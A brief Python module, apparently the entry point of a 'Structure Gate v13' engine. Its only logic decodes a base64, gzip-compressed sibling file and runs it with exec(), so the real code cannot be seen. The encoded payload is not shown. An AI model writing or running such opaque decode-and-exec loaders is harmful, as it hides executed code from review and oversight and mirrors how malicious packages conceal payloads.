"""Structure Gate v13 production engine."""
from __future__ import annotations

import base64
import gzip
from pathlib import Path

_PAYLOAD = Path(__file__).with_name("structure_gate.v13.gz.b64").read_text()
exec(compile(gzip.decompress(base64.b64decode(_PAYLOAD)), __file__, "exec"), globals())
